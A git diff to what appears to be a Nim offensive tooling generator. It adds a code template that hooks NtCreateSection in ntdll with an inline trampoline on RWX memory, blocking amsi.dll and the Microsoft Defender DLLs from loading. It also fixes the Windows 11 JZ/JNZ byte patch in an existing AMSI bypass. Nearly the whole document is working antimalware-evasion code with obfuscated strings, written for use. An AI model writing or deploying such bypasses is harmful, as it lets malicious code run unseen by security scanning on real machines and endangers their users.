@@ -135,6 +135,206 @@ when isMainModule:
 
 """
 
+let AMSINtCreateSectionHookStub * = """
+
+import winim/lean
+import strutils
+
+type
+    typeNtCreateSection* = proc (SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                       MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                       FileHandle: HANDLE): NTSTATUS {.stdcall.}
+
+
+type
+    MyNtFlushInstructionCache* = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}
+
+
+
+type
+  HookedNtCreate* {.bycopy.} = object
+    origNtCreate*: typeNtCreateSection
+    ntCreateStub*: array[16, BYTE]
+
+  HookTrampolineBuffers* {.bycopy.} = object
+    originalBytes*: HANDLE    ##  (Input) Buffer containing bytes that should be restored while unhooking.
+    originalBytesSize*: DWORD  ##  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
+    previousBytes*: HANDLE
+    previousBytesSize*: DWORD
+
+
+var ntdlldll = LoadLibraryA("ntdll.dll")
+if (ntdlldll == 0):
+    when defined(verbose):
+        echo obf("[X] Failed to load ntdll.dll")
+
+var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,"NtFlushInstructionCache")
+if isNil(NtFlushInstructionCacheAddress):
+    when defined(verbose):
+        echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")
+
+var NtFlushInstructionCache*: MyNtFlushInstructionCache
+NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)
+
+proc hookntCreateSection*(): bool
+
+proc fastTrampoline*(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOID;
+                    buffers: ptr HookTrampolineBuffers = nil): bool
+
+var g_hookedNtCreate*: HookedNtCreate
+
+var ntCreate_Address*: HANDLE
+
+var NtCreateSection*: typeNtCreateSection
+
+proc MyNtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                       MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                       FileHandle: HANDLE): NTSTATUS
+
+proc restore_hook_ntcreatesection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                       MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                       FileHandle: HANDLE): BOOL =
+
+    var buffers: HookTrampolineBuffers
+
+    buffers.originalBytes = cast[HANDLE](addr g_hookedNtCreate.ntCreateStub[0])
+    buffers.originalBytesSize = DWORD(sizeof(g_hookedNtCreate.ntCreateStub))
+     
+    var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection"))
+    var trampolinesuccess: bool = fastTrampoline(false, cast[LPVOID](ntCreate_Address), cast[LPVOID](MyNtCreateSection), &buffers)
+    if (trampolinesuccess == false):
+        when defined(verbose):
+            echo obf("Failed to install trampoline")
+        quit(1)
+    else:
+        when defined(verbose):
+            echo obf("Restored old function values!")
+    when defined(verbose):
+        echo obf("Calling real NtCreateSection\r\n")
+    
+    NtCreateSection = cast[typeNtCreateSection](addressToHook)
+    discard NtCreateSection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)
+    when defined(verbose):
+        echo obf("RE-Hooking")
+    hookntCreateSection()
+
+proc MyNtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                       MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                       FileHandle: HANDLE): NTSTATUS =
+
+    if(FileHandle != 0):
+        var lpFileName: array[4096, WCHAR]
+        var res: DWORD = GetFinalPathNameByHandle(FileHandle, cast[LPWSTR](addr lpFileName), DWORD(256), DWORD(FILE_NAME_OPENED or VOLUME_NAME_DOS)) # Get the file path of the file handle
+        if (res == 0):
+            when defined(verbose):
+                echo obf("[X] Failed to get the file path of the file handle")
+        else:
+            when defined(verbose):
+                echo obf("GetFinalPathNameByHandleA success")
+            
+            var dllName: string = $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
+            when defined(verbose):
+                echo obf("Following DLL wants to be loaded: "), $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
+            if(("amsi.dll" in dllName) or ("MpOAV.dll" in dllName) or ("MpClient.dll" in dllName) or ("MsMpLics.dll" in dllName)):
+                when defined(verbose):
+                    echo obf("[X] AMSI is being loaded")
+                    echo obf("Stopping it")
+                return 0 # Return 0 to prevent AMSI from being loaded
+                # If set -1, will trigger SEH exception and will show an error in the screen (but also works)
+            else:
+                if(restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)): #If it's not an AMSI DLL restore the original NtCreateSection
+                    when defined(verbose):
+                        echo obf("Restore success")
+proc fastTrampoline(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOID;
+                    buffers: ptr HookTrampolineBuffers): bool =
+    var trampoline: seq[byte]
+    if defined(amd64):
+        trampoline = @[
+            byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
+            byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
+        ]
+        var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
+        copyMem(&trampoline[2] , &tempjumpaddr, 6)
+    elif defined(i386):
+        trampoline = @[
+            byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
+            byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
+        ]
+        var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
+        copyMem(&trampoline[1] , &tempjumpaddr, 3)
+    
+    var dwSize: DWORD = DWORD(len(trampoline))
+    var dwOldProtect: DWORD = 0
+    var output: bool = false
+    
+
+    if (installHook):
+        if (buffers != nil):
+            if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
+                when defined(verbose):
+                    echo obf("Previous Bytes == 0")
+                return false
+            copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
+
+        if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
+            when defined(verbose):
+                echo obf("Virtual Protect to RWX success!")
+            copyMem(addressToHook, addr trampoline[0], dwSize)
+            output = true
+    else:
+        when defined(verbose):
+            echo obf("Restoring old NtCreateSection!")
+            echo obf("Original Bytes restore address: "), toHex(buffers.originalBytes)
+            echo obf("Original Bytes Size: "), buffers.originalBytesSize
+        if (buffers != nil):
+            if ((buffers.originalBytes == 0) or buffers.originalBytesSize == 0):
+                when defined(verbose):
+                    echo obf("Original Bytes == 0")
+                return false
+
+            dwSize = buffers.originalBytesSize
+
+            if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
+                copyMem(addressToHook, cast[LPVOID](buffers.originalBytes), dwSize)
+                output = true
+    
+    var status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize)
+    if (status == 0):
+        when defined(verbose):
+            echo obf("NtFlushInstructionCache success")
+    else:
+        when defined(verbose):
+            echo obf("NtFlushInstructionCache failed: "), toHex(status)
+    VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)
+
+    return output
+
+proc hookntCreateSection(): bool =
+    var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection"))
+    ntCreate_Address = cast[HANDLE](addressToHook)
+    var buffers: HookTrampolineBuffers
+    var output: bool = false
+    
+    if (addressToHook == nil):
+        return false
+        
+    buffers.previousBytes = cast[HANDLE](addressToHook)
+    buffers.previousBytesSize = DWORD(sizeof(addressToHook))
+    g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
+    var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
+    copyMem(PointerToOrigBytes, addressToHook, 16)
+    
+    output = fastTrampoline(true, cast[LPVOID](addressToHook), cast[LPVOID](MyNtCreateSection), &buffers)
+    return output
+
+var hooksuccess = hookntCreateSection()
+when defined(verbose):
+    echo obf("Hook:"), hooksuccess
+
+
+"""
+
+
 let AMSIProviderPatchStub * = """
 
 from winregistry/winregistry import RegHandle,open,enumSubkeys,readString,samRead,enumValueNames
@@ -360,7 +560,7 @@ proc PatchAmsi(): bool =
         #cs = cs + 0x83 # Old value for Win10 to change JNZ to JZ. Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
     else:
         #cs = cs + 0x75 # old value
-        css = cs + 0x47 # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
+        cs = cs + 0x47 # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
     var oldProtection: DWORD = 0
     var success: BOOL
     var protectAddress = cs
